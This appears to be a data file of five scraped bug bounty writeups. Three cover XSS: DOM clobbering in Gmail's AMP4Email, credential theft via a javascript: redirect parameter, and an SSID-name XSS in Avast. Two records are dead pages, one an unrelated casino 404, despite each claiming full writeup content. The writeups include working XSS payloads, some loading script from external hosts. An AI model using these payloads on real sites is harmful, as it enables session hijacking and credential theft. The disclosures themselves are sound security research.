{"source_url": "https://research.securitum.com/xss-in-amp4email-dom-clobbering/", "title": "XSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com", "friendly_explanation": "This is a bug bounty writeup from https://research.securitum.com/xss-in-amp4email-dom-clobbering/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS in GMail's AMP4Email via DOM Clobbering - research.securitum.com Skip to content research.securitum.com securitum.com vulnerabilities researches and cyber security education publications Primary Menu Research blog Penetration Testing Contact us About us XSS in GMail’s AMP4Email via DOM Clobbering Michał Bentkowski | November 18, 2019 November 18, 2019 | Research This post is a write up of an already-fixed XSS in AMP4Email I reported via Google Vulnerability Reward Program in August 2019. The XSS is an example of a real-world exploitation of well-known browser issue called DOM Clobbering. What is AMP4Email AMP4Email (also known as dynamic mail) is a new feature of Gmail that makes it possible for emails to include dynamic HTML content. While composing emails containing HTML markup has been done for years now, it’s been usually assumed that the HTML contains only static content, i.e. some kind of formatting, images etc. without any scripts or forms. AMP4Email is meant to go one step further and allow dynamic content in emails. In a post in Google official G Suite blog , the use caes for dynamic mails are nicely summarized: With dynamic email, you can easily take action directly from within the message itself, like RSVP to an event, fill out a questionnaire, browse a catalog or respond to a comment. Take commenting in Google Docs, for example. Instead of receiving individual email notifications when someone mentions you in a comment, now, you’ll see an up-to-date thread in Gmail where you can easily reply or resolve the comment, right from within the message. The feature raises some obvious security questions; the most important one probably being: what about Cross-Site Scripting (XSS)? If we’re allowing dynamic content in emails, does that mean that we can easily inject arbitrary JavaScript code? Well – no; it’s not that easy. AMP4Email has a strong validator which, in a nutshell, is a strong whitelist of tags and attributes that are allowed in dynamic mails. You can play around with it on https://amp.gmail.dev/playground/ , in which you can also send a dynamic email to yourself to see how it works! Fig 1. AMP4Email playground If you try to add any HTML element or attribute that is not explicitly allowed by the validator, you’ll receive an error. Fig 2. AMP Validator disallows arbitrary script tags When playing around with AMP4Email and trying various ways to bypass it, I noticed that id attribute is not disallowed in tags (Fig 3). Fig 3. Attribute id is not disallowed This looked like a fine place to start the security analysis, since creating HTML elements with user-controlled id attribute can lead to DOM Clobbering . DOM Clobbering DOM Clobbering is a legacy feature of web browsers that just keeps causing trouble in many applications. Basically, when you create an element in HTML (for instance <input id=username> ) and then you want wish to reference it from JavaScript, you would usually use a function like document.getElementById('username') or document.querySelector('#username') . But these are not the only ways! The legacy way is to just access it via a property of global window object. So window.username is in this case exactly the same as document.getElementById('username') ! This behaviour (which is known as DOM Cloberring) can lead to interesting vulnerabilities if the application makes decisions based on existence of certain global variables (imagine: if (window.isAdmin) { ... } ). For further analysis of DOM Clobbering, suppose that we have the following JavaScript code: Python if (window.test1.test2) { eval(''+window.test1.test2) } 1 2 3 if ( window . test1 . test2 ) { eval ( '' + window . test1 . test2 ) } and our job is to evaluate arbitrary JS code using only DOM Clobbering techniques. To solve the task, we need to find solutions to two problems We know that we can create new properties on window , but can we create new properties on other objects (the case of test1.test2 )? Can we control how our DOM elements are casted to string? Most HTML elements, when casted to string, returns something similar to [object HTMLInputElement] . Let’s begin with the first problem. The way to solve it that is most commonly referenced is to use <form> tag. Every <input> descendent of the <form> tag is added as a property of the <form> with the name of the property equal to the name attribute of the <input> . Consider the following example: Python <form id=test1> <input name=test2> </form> <script> alert(test1.test2); // alerts \"[object HTMLInputElement]\" </script> 1 2 3 4 5 6 < form id = test1 > < input name = test2 > < / form > <script> alert ( test1 . test2 ) ; // alerts \"[object HTMLInputElement]\" </script> To solve the second problem, I’ve created a short JS code that iterates over all possible elements in HTML and checks whether their toString method inherits from Object.prototype or are defined in another way. If they don’t inherit from Object.prototype , then probably something else than [object SomeElement] would be returned. Here’s the code: Python Object.getOwnPropertyNames(window) .filter(p => p.match(/Element$/)) .map(p => window[p]) .filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString) 1 2 3 4 Object . getOwnPropertyNames ( window ) . filter ( p = > p . match ( / Element $ / ) ) . map ( p = > window [ p ] ) . filter ( p = > p && p . prototype && p . prototype . toString ! == Object . prototype . toString ) The code returns two elements: HTMLAreaElement ( <area> ) and HTMLAnchorElement ( <a> ). The first one is disallowed in AMP4Email so let’s focus only on the second one. In case of <a> element, toString returns just a value of href attribute. Consider the example: Python <a id=test1 href=https://securitum.com> <script> alert(test1); // alerts \"https://securitum.com\" </script> 1 2 3 4 < a id = test1 href = https : // securitum . com > <script> alert ( test1 ) ; // alerts \"https://securitum.com\" </script> At this point, it may seem that if we want to solve the original problem (i.e. evaluate value of window.test1.test2 via DOM Clobbering), we need a code similar to the following: Python <form id=test1> <a name=test2 href=\"x:alert(1)\"></a> </form> 1 2 3 < form id = test1 > < a name = test2 href = \"x:alert(1)\" > < / a > < / form > The problem is that it doesn’t work at all; test1.test2 would be undefined . While <input> elements do become properties of <form> , the same doesn’t happen with <a> . There’s an interesting solution to this problem, though, that works in WebKit- and Blink-based browsers. Let’s say that we have two elements with the same id : Python <a id=test1>click!</a> <a id=test1>click2!</a> 1 2 < a id = test1 > click ! < / a > < a id = test1 > click2 ! < / a > So what we’re going to get when accessing window.test1 ? I’d intuitively expect getting the first element with that id (this is what happens when you try to call document.getElementById('#test1') . In Chromium, however, we actually get an HTMLCollection ! Fig 4. window.test1 points to HTMLCollection What is particularly interesting here (and that can be spotted in fig. 4) is that the we can access specific elements in that HTMLCollection via index ( 0 and 1 in the example) as well as by id . This means that window.test1.test1 actually refers to the first element. It turns out that setting name attribute would also create new properties in the HTMLCollection . So now we have the following code: Python <a id=test1>click!</a> <a id=test1 name=test2>click2!</a> 1 2 < a id = test1 > click ! < / a > < a id = test1 name = test2 > click2 ! < / a > And we can access the second anchor element via window.test1.test2 . Fig 5. We can make window.test1.test2 defined So going back to the original exercise of exploiting eval(''+window.test1.test2) via DOM Clobbering, the solution would be: Python <a id=\"test1\"></a><a id=\"test1\" name=\"test2\" href=\"x:alert(1)\"></a> 1 < a id = \"test1\" > < / a > < a id = \"test1\" name = \"test2\" href = \"x:alert(1)\" > < / a > Let’s now go back to AMP4Email to see how DOM Clobbering could be exploited in a real-world case. Exploiting DOM Clobbering in AMP4Email I’ve already mentioned that AMP4Email could be vulnerable to DOM Clobbering by adding my own id attributes to elements. To find some exploitable condition, I decided to have a look at properties of window (Fig 6). The ones that immediately caught attention were beginning with AMP . Fig 6. Properties of window global object At this point, it turned out that AMP4Email actually employs some protection against DOM Clobbering because it strictly forbids certain values for id attribute, for instance: AMP (Fig 7.). Fig 7. AMP is an invalid value for id in AMP4Email The same restriction didn’t happen with AMP_MODE , though. So I prepared a code <a id=AMP_MODE> just to see what happens… … and then I noticed a very interesting error in the console (Fig 8). Fig 8. 404 on loading certain JS file As seen in fig 8., AMP4Email tries to load certain JS file and fails to do so because of 404. What is particularly eye-catching, however, is the fact that there’s undefined in the middle of the URL ( https://cdn.ampproject.org/rtv/ undefined /v0/amp-auto-lightbox-0.1.js ). There was just one plausible explanation why this happens I could come up with: AMP tries to get a property of AMP_MODE to put it in the URL. Because of DOM Clobbering, the expected property is missing, hence undefined . The code responsible for the code inclusion is shown below: Python f.preloadExtension = function(a, b) { \"amp-embed\" == a && (a = \"amp-ad\"); var c = fn(this, a, !1); if (c.loaded || c.error) var d = !1; else void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element=\"' + a + '\"]'), c.scriptPresent = !!d), d = !c.scriptPresent; if (d) { d = b; b = this.win.document.createElement(\"script\"); b.async = !0; yb(a, \"_\") ? d = \"\" : b.setAttribute(0 <= dn.indexOf(a) ? \"custom-template\" : \"custom-element\", a); b.setAttribute(\"data-script\", a); b.setAttribute(\"i-amphtml-inserted\", \"\"); var e = this.win.location; t().test && this.win.testLocation && (e = this.win.testLocation); if (t().localDev) { var g = e.protocol + \"//\" + e.host; \"about:\" == e.protocol && (g = \"\"); e = g + \"/dist\" } else e = hd.cdn; g = t().rtvVersion; null == d && (d = \"0.1\"); d = d ? \"-\" + d : \"\"; var h = t().singlePassType ? t().singlePassType + \"/\" : \"\"; b.src = e + \"/rtv/\" + g + \"/\" + h + \"v0/\" + a + d + \".js\"; this.win.document.head.appendChild(b); c.scriptPresent = !0 } return gn(c) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 f . preloadExtension = function ( a , b ) { \"amp-embed\" == a && (a = \"amp-ad\"); var c = fn ( this , a , ! 1 ) ; if ( c . loaded | | c . error ) var d = ! 1 ; else void 0 === c . scriptPresent && (d = this.win.document.head.querySelector('[custom-element=\"' + a + '\"]'), c.scriptPresent = !!d), d = !c.scriptPresent; if ( d ) { d = b ; b = this . win . document . createElement ( \"script\" ) ; b . async = ! 0 ; yb ( a , \"_\" ) ? d = \"\" : b . setAttribute ( 0 < = dn . indexOf ( a ) ? \"custom-template\" : \"custom-element\" , a ) ; b . setAttribute ( \"data-script\" , a ) ; b . setAttribute ( \"i-amphtml-inserted\" , \"\" ) ; var e = this . win . location ; t ( ) . test && this.win.testLocation && (e = this.win.testLocation); if ( t ( ) . localDev ) { var g = e . protocol + \"//\" + e . host ; \"about:\" == e . protocol && (g = \"\"); e = g + \"/dist\" } else e = hd . cdn ; g = t ( ) . rtvVersion ; null == d && (d = \"0.1\"); d = d ? \"-\" + d : \"\" ; var h = t ( ) . singlePassType ? t ( ) . singlePassType + \"/\" : \"\" ; b . src = e + \"/rtv/\" + g + \"/\" + h + \"v0/\" + a + d + \".js\" ; this . win . document . head . appendChild ( b ) ; c . scriptPresent = ! 0 } return gn ( c ) } While it is not particularly difficult to read, below is shown a manually deobfuscated form of the code (with some parts being omitted for clarity): Python var script = window.document.createElement(\"script\"); script.async = false; var loc; if (AMP_MODE.test && window.testLocation) { loc = window.testLocation } else { loc = window.location; } if (AMP_MODE.localDev) { loc = loc.protocol + \"//\" + loc.host + \"/dist\" } else { loc = \"https://cdn.ampproject.org\"; } var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\"; b.src = loc + \"/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var script = window . document . createElement ( \"script\" ) ; script . async = false ; var loc ; if ( AMP_MODE . test && window.testLocation) { loc = window.testLocation } else { loc = window.location; } if ( AMP_MODE . localDev ) { loc = loc . protocol + \"//\" + loc . host + \"/dist\" } else { loc = \"https://cdn.ampproject.org\" ; } var singlePass = AMP_MODE . singlePassType ? AMP_MODE . singlePassType + \"/\" : \"\" ; b . src = loc + \"/rtv/\" + AMP_MODE . rtvVersion ; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\" ; document . head . appendChild ( b ) ; So, in line 1, the code creates a new script element. Then, checks whether AMP_MODE.test and window.testLocation are both truthy. If they are, and also AMP_MODE.localDev is truthy (line 11), then window.testLocation is being used as a base for generating the URL of the script. Then, in lines 17 and 18 some other properties are concatenated to form the full URL. While it may not be obvious at the first sight, because of how the code is written and thanks to DOM Clobbering, we can actually control the full URL. Let’s assume that AMP_MODE.localDev and AMP_MODE.test are truthy, to see how the code simplifies even more: Python var script = window.document.createElement(\"script\"); script.async = false; b.src = window.testLocation.protocol + \"//\" + window.testLocation.host + \"/dist/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\") + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 1 2 3 4 5 6 7 8 9 10 var script = window . document . createElement ( \"script\" ) ; script . async = false ; b . src = window . testLocation . protocol + \"//\" + window . testLocation . host + \"/dist/rtv/\" + AMP_MODE . rtvVersion ; + \"/\" + ( AMP_MODE . singlePassType ? AMP_MODE . singlePassType + \"/\" : \"\" ) + \"v0/\" + pluginName + \".js\" ; document . head . appendChild ( b ) ; Do you remember our earlier exercise of overloading window.test1.test2 with DOM Clobbering? Now we need to do the same, only overload window.testLocation.protocol . Hence the final payload: Python <!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--> <a id=\"AMP_MODE\"></a> <a id=\"AMP_MODE\" name=\"localDev\"></a> <a id=\"AMP_MODE\" name=\"test\"></a> <!-- window.testLocation.protocol is a base for the URL --> <a id=\"testLocation\"></a> <a id=\"testLocation\" name=\"protocol\" href=\"https://pastebin.com/raw/0tn8z0rG#\"></a> 1 2 3 4 5 6 7 8 9 < ! -- We need to make AMP_MODE . localDev and AMP_MODE . test truthy -- > < a id = \"AMP_MODE\" > < / a > < a id = \"AMP_MODE\" name = \"localDev\" > < / a > < a id = \"AMP_MODE\" name = \"test\" > < / a > < ! -- window . testLocation . protocol is a base for the URL -- > < a id = \"testLocation\" > < / a > < a id = \"testLocation\" name = \"protocol\" href = \"https://pastebin.com/raw/0tn8z0rG#\" > < / a > Actually, the code didn’t execute in the real-world case because of Content-Security-Policy deployed in AMP: Python Content-Security-Policy: default-src 'none'; script-src 'sha512-oQwIl...==' https://cdn.ampproject.org/rtv/ https://cdn.ampproject.org/v0.js https://cdn.ampproject.org/v0/ 1 2 3 4 5 Content - Security - Policy : default - src 'none' ; script - src 'sha512-oQwIl...==' https : // cdn . ampproject . org / rtv / https : // cdn . ampproject . org / v0 . js https : // cdn . ampproject . org / v0 / I didn’t find a way to bypass the CSP, but when trying to do so, I found an interesting way of bypassing dir-based CSP and I tweeted about it (later it turned out that the same trick was already used in a CTF in 2016 ). Google in their bug bounty program, don’t actually expect bypassing CSP and pay a full bounty anyway. It was still an interesting challenge; maybe someone else will find way to bypass 🙂 Summary In the post, I’ve shown how DOM Clobbering could be used to perform an XSS if certain conditions are met. It was surely an interesting ride! If you wish to play around with these kind of XSS-es, have a look at my XSS Challenge , which was based on this very XSS. Timeline : 15th Aug 2019 – sending report to Google 16th Aug 2019 – “nice catch!”, 10th Sep 2019 – response from Google: “the bug is awesome, thanks for reporting!”, 12th Oct 2019 – confirmation from Google that the bug is fixed (although in reality it happened way earlier), 18th Nov 2019 – publication. Author: Michał Bentkowski Tagged: amp4email , Bug Bounty , XSS Next posts: Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) Protecting against social engineering-based attacks – an introduction Michał Bentkowski Chief Security Researcher, Securitum 8+ years of penetration testing and bounty hunting. Listed on Google's hall of fame at place 0x08. Numerous publications in English and Polish (distinguished https://sekurak.pl/ author). He speaks XSS. All posts by author Find us on Linkedin! Research updates? Please leave this field empty E-mail address * We keep your data private and use it only for research updates newsletter. We also hate spam! Read our Privacy Policy. Check your inbox or spam folder to confirm your subscription. Categories Education 44 Research 35 Uncategorized 1 Tags Active Directory · Analysis · Apache · Browser security · Bug Bounty · Bypass · CA · Camera · CCTV · Cryptography · CSS · Desktop · dompurify · FDE · Google · Hack · hacking · HTTP · HTTP/2 · IDS · IoT · javascript · json web token · jwt · kibana · Linux · lsass · Malware · Mozilla Firefox · mxss · NMAP · OSINT · pebble · RCE · Reconnaissance · SSL · ssti · Takeover · Upload · Vulnerability · Web Hacking · WiFi · windows · Wordpress · XSS Archives 2023 3 2022 8 2021 3 2020 10 2019 8 2018 10 2017 18 2016 8 2015 5 Follow us on: LinkedIn Facebook Twitter GitHub Pages Research Home Page Penetration testing Privacy Policy About us Contact us Recent Posts How Private Cache Can Lead to Mass Account Takeover – pentest case July 12, 2023 XSS in WordPress via open embed auto discovery May 29, 2023 How to access data secured with BitLocker? Do a system update January 12, 2023 Amazon once again lost control (for 3 hours) over the IP pool in a BGP Hijacking attack October 28, 2022 SOCMINT – or rather OSINT of social media October 15, 2022 ©2025 research.securitum.com We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it. You can read more at our Privacy Policy (link below). Ok"}
{"source_url": "https://medium.com/@tech96bot/oneplus-xss-vulnerability-in-customer-support-portal-d5887a7367f4", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tech96bot/oneplus-xss-vulnerability-in-customer-support-portal-d5887a7367f4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@mehulcodes/stealing-login-credentials-with-reflected-xss-7cb450bf5710", "title": "Stealing login credentials with Reflected XSS | by mehulpanchal007 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mehulcodes/stealing-login-credentials-with-reflected-xss-7cb450bf5710. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing login credentials with Reflected XSS | by mehulpanchal007 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stealing login credentials with Reflected XSS mehulpanchal007 1 min read · Oct 1, 2019 -- Listen Share H ello Hackers, This was my first bounty worth $100. I got really exited at the moment the email notification popped-up. Read this write-up to know how I got that bug. Let’s name the website as www.example.com. I understood that how the application works. After understanding, I logged out of the application and tried to visit the paths that are only available to logged-in users. As soon as I hit the first path in my list, I was redirected to “/login?redirect_to=%2fsettings”. And Open-redirect vulnerability clicked into my mind and I was successful to get a redirect to https://google.com/ by visiting https://www.example.com/login?redirect_to=https%3A%2f%2fgoogle.com%2f and logging in to www.example.com Then, I tried to get XSS by visiting https://www.example.com/login?redirect_to=javascript%3Aalert(1) and got that alert popup. Then I thought why not try to steal login credentials. So I went for that after a good night sleep. I visited the link: https://www.example.com%2Flogin%3Fredirect_to%3Djavascript%3Aalert%28document.getElementById%28%2522email%2522%29.value%29%253B%2520alert%28document.getElementById%28%2522password%2522%29.value%29 An Alert popped up for both email and password of victim So the attack is like, attacker sends email to vicitm including the above URL with javascript such as to send credentials to attack server and the victim clicks the link and bOOOOm… Infosec Xss Attack Hackerone Bug Bounty Hacking -- -- Written by mehulpanchal007 71 followers · 1 following 1) No System is Safe!, 2) Aim For The Impossible, 3) Have Fun In CyberSpace & MeatSpace No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://noobe.io/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce", "title": "Page Not Found - XVIP", "friendly_explanation": "This is a bug bounty writeup from https://noobe.io/articles/2019-09/exploiting-cookie-based-xss-by-finding-rce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage Not Found - XVIP Chuyển đến nội dung Game Hot Live Casino Hướng Dẫn Link Xvip Đăng Ký Đăng Nhập Nạp Tiền Rút Tiền Khuyến Mãi Hỏi Đáp Thường Gặp Liên Hệ Về Chúng Tôi đăng ký 404 Ối! Không thể tìm thấy trang đó. Có vẻ như không có gì được tìm thấy ở vị trí này. Có thể thử một trong các liên kết dưới đây hoặc tìm kiếm? XVIP là cổng game đang gây sốt hiện nay với nhiều phần thưởng cho thành viên mới. Tải ngay trên iOS/Android tại XVIP.casino. LIÊN HỆ HỖ TRỢ Phone: +84-943-347-586 Email: [email protected] LIÊN KẾT NHANH Link XVIP Giới Thiệu Chăm Sóc Khách Hàng Khuyến Mãi Tại XVIP Nạp Tiền / Rút Tiền Hỏi Đáp Thường Gặp Chính Sách Bảo Mật Miễn Trừ Trách Nhiệm Copyright 2025 © Bản quyền thuộc XVIP"}
{"source_url": "https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968", "title": "5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!) | by YoKo Kho | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!) | by YoKo Kho | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!) CVE-2019–18653 & CVE-2019–18654: The story when Reflected XSS was triggered from the SSID Name (It also affected AVG AntiVirus because basically the product codes were mostly “merged”). YoKo Kho 9 min read · Oct 29, 2019 -- 1 Listen Share بسم الله الرحمن الرحيم So, this article will be explained in two ways, which are the one that tells how I got it and the one that tries to explain the basic and reference . Readers could also read the TL;DR section directly. I. TL;DR 1.1. Create an SSID Name with a simple XSS Payload (with maximum = 32 characters). We can use BruteLogic and s0md3v short XSS payload (thanks man!). 1.2. Connect your Windows OS (with Avast AntiVirus installed and active) to the SSID and wait for the Avast Network Notification Feature to trigger the XSS payload. Press enter or click to view image in full size Triggering the XSS via SSID Name 1.3. Report it to Avast and confirmed as a valid issue in about 2 days. And a few months later, they judged whether the issue was rather serious and decided to reward the report with $5000. II. Behind the Scene about How I got this Issue A few years ago, I read a good article from one of the bug hunters when he just got a lot of XSS issues in some big companies by putting XSS payload on his SSID name (I really lost the bookmark for one reason). In short, when he surfs to many applications, he gets many applications that reflect the value of his SSID name (and XSS is triggered). From there, then I started using XSS payload as my SSID name (on OS X). So, a few months ago, I got a notebook (with windows in it) from the office where I was working at that time. I installed everything I needed from the tethering connection and left Avast AntiVirus for the last (at home). At home, I continued the installation and everything went well. Until one day I use this notebook again for training purposes. In the middle of training (day 3 or day 4), In the middle of training (day 3 or day 4), I had a problem with the used connection. So, suddenly this notebook connects to my tethering connection automatically (with Avast already installed), and within seconds, I get a pop-up warning with “ https://local.avast.com ” appearing on my desktop. To be honest, I don’t know how it works. Lucky for me, there was a video recording in class and I asked to copy a conversation between this time period. Trying to find out how that happened, I finally got an answer the next day. That XSS is triggered because the embedded “ Network Notification Feature ” (Firewall) in Avast (specifically for Internet Security and Premiere Edition) reflects the SSID name and has not been sanitized yet. Then I made a report that night, and got a reply about 2 days confirming whether the issue was valid. III. Abstract As quoted from Avast’s official site, Avast as one of the largest security companies in the world that using next-gen technologies to fight cyber-attacks in real time, is dedicated to creating a world that provides safety and privacy for all, no matter who you are, where you are, or how you connect. With so much research done by Avast, Avast tries to achieve the best endpoint protection for every user. One feature that has been embedded is the “ Firewall ” feature that can be used easily to manage incoming and outgoing traffic. By default, this Firewall feature can give users a warning (pop-up notification) when they are connected to a new network . For example, like the image shown below, this shows that the user has just connected to a wireless network with “My Hotspot” as the SSID name. Press enter or click to view image in full size Popup Notification when Connected to new Network After the popup appears, the user can choose the type of network from the SSID they are connecting to, such as a “ Private ” network or a “ Public ” network. However, a problem arises when this notification popup does’t filter out special characters that are reflected from the SSID name. In other words, an attacker can trigger XSS on a client through “ popup notifications ” by using the malicious SSID name. IV. Introduction 4.1. Cross Site Scripting (XSS) To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Stored XSS that “saves” the executed code, Reflected XSS actually doesn’t save this script at all, so the “target” is expected and required to visit the URL that has been “injected” by additional contents from an Attacker. In this situation, Avast has reflected the input (from the SSID Name) into the popup notification (each time the user changes the connection). When the SSID name contains client-side scripts (such as javascript), notifications will trigger scripts that can trigger XSS vulnerabilities. One good thing, even the SSID name has a limit of around 32 characters, we can still cut it off by calling a short URL. Credits to Brute Logic and S0md3v , Thanks man! 4.1.1. The Short XSS Payload The first time I got a popup warning, I didn’t know how to trigger it further. Then Alhamdulillah, I was very lucky because I remembered reading a publication made by “ Brute Logic ” and “ S0md3v ” related the short XSS Payload. And the cool thing is, it works! If you are looking for great and creative XSS payloads, then I recommend both of these researches: • https://brutelogic.com.br/blog/shortest-reflected-xss-possible/ • https://github.com/s0md3v/AwesomeXSS And yes (of course), there are plenty of researchers out there who still share other great and creative payload that you can follow. 4.2. Research Story related things that could be Executed by using the Malicious SSID Name As explained earlier, I realized this trick from writing released by one of the bug hunters (I’m very sorry, I really lost my bookmark because of one thing). From his research, I finally learned that research in this field was carried out in great detail in the 2013 by Deral Heiland. He has published the research at BlackHat Europe 2013 . So, for research and in-depth knowledge about this, you can refer to his presentation. Very recommended. 4.3. Affected Version and Testing Environment Avast: The affected version of this vulnerability could be found at Avast Internet Security version 19.3.2369 (build 19.3.4241.440) . It also affects the Avast Free Antivirus the premiere one. And from the AVG side: the issue was affects the AVG Internet Security version 19.3.3084 (build 19.3.4241.440). As a little note, both of issue has been reproduced at the Windows 10 environment (latest patch — per March 22nd, 2019). V. Summary of Issue As explained earlier, the security problem in this report is a vulnerability that can allow an Attacker to trigger XSS on the client through “popup notifications” using the malicious SSID name. In this situation, the Attacker can also display a fake login page (for example with the Avast / AVG logo) via “popup notifications” and the user will not feel suspicious because there is no URL that can be seen / detected when the script triggers a fake login page. Press enter or click to view image in full size Sample Case to Triggering the Fake Login Page - Avast Press enter or click to view image in full size Sample Case to Triggering the Fake Login Page - AVG VI. Proof of Concept To complete the explanation, there are few things that must be done to reproduce this issue. Here are the steps that need to be prepared: 6.1. Create SSID with simple JavaScript as the name of the SSID. For example: ><img src=x onerror=prompt(1)> The basic purpose of using this script is to trigger a popup warning with “1” as a character. 6.2. Make sure if the victim is connected to the SSID that was prepared; 6.3. After the victim is connected to the SSID that is prepared, then wait a few seconds. A pop-up notification will be displayed, and the script will be triggered: Press enter or click to view image in full size The Script has been Triggered via Notification Popup - Avast Press enter or click to view image in full size The Script has been Triggered via Notification Popup - AVG 6.4. Because the SSID name is limited to 32 characters, we must trick the script by using the short URL service. For example, we try to trigger login forms from other portals.. The used script is: ><embed src=//tiny.cc/XYZABCX> (you also could use bit.ly). Press enter or click to view image in full size Triggering the Login Form from other Portal to Notification Popup Press enter or click to view image in full size Triggering the Login Form from other Portal to Notification Popup II And the good thing is, you can also trigger scripts from other external URLs (credits to s0md3v). Here is an example: ><embed src=//14.rs> Press enter or click to view image in full size Triggering the script by Using the External Script VII. Additional Information To complete the explanation, here is a simple PoC video that can be seen about this: PoC Video - Triggering the XSS Payload via SSID Name VIII. Reporting Timeline Mar 21st, 2019: Found the issue and don’t know the root cause yet; Mar 22nd, 2019: Found the problem, then create and send the report via bugs@avast.com; Mar 25th, 2019: Send the information if AVG is affected too; Mar 25th, 2019: Avast replied and confirmed the bug. They said if they will release a fix soon; Mar 25th, 2019: Avast replied if that not surprising (if AVG was affect with the same issue). They give a high level explanation nicely. May 24th, 2019: Avast said if the issue was fixed (in Avast 19.4) and already release. They also said if they will give more details when the reward is decided. June 12th, 2019: Avast judged this issue to be rather serious and decided to reward the report with $5000. (Really amazing). Press enter or click to view image in full size Reward Decision from Avast This one really broke the record I had in one reward payment. Also, that decision really surprised me. At that time, I still didn’t believe until the numbers actually came into my Paypal account. For Avast: Thank you very much for the surprising reward and amazing program! Greatly appreciated. I have lost my words to thanking them. Oct 30th, 2019: CVE-2019–18653 has been assigned for issue at Avast and CVE-2019–18654 has been assigned for issue at AVG. IX. The Closing Well, as can be seen by the reader, this is something I never imagined (triggering XSS on the Desktop App). Some simple notes that I might be able to share (with my limited knowledge) are: Always try to bookmark everything you read. Put notes and comeback when you want to use those tricks for your target. In this case, one day I read and saved a publication made by Brute Logic and s0md3v. When I meet a difficult situation (for example triggering XSS with limited characters), I return to their write-up and open my notes. Even though it looks silly, it would be better if you enter your SSID name with (for example) Payload XSS. I have placed it for several years (since the first time I read the article published by a bug hunter out there, thank you!), But I found it was triggered in 2019 on Desktop Applications on Windows OS (does’t affect the OS X version of Avast). Also, another vector that I learned from this is: XSS through malicious SSID Names can also be triggered for the one that reflecting or storing our SSID name at the App. In this case, Avast and AVG has reflecting the SSID Name. Apart from the desktop one, just please kindly don’t forget about the XSS that could also be triggered by Web or Mobile Application that reflecting the SSID Name. At the other side, I also have learnt if the one that stored the SSID Name could also be vulnerable. At least, I have saw it at few write-ups such as: • [CVE-2019–11877] Credentials Stealing Through XSS on Pix-Link Repeater • [CVE-2017–14219] XSS in Intelbras Router WRN 240 — Getting Wireless Password and Administrator Session Without Being Connected on the Same Network • [CVE-2018–17337] XSS via SSID at N.Plug Wireless Repeater version 1.0.0.14 X. Credits https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf https://blog.rapid7.com/2016/03/09/its-all-in-the-name/ (also written by Deral Heiland) https://brutelogic.com.br/blog/shortest-reflected-xss-possible/ https://github.com/s0md3v/AwesomeXSS Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Xss Infosec Security Bug Bounty Tips -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
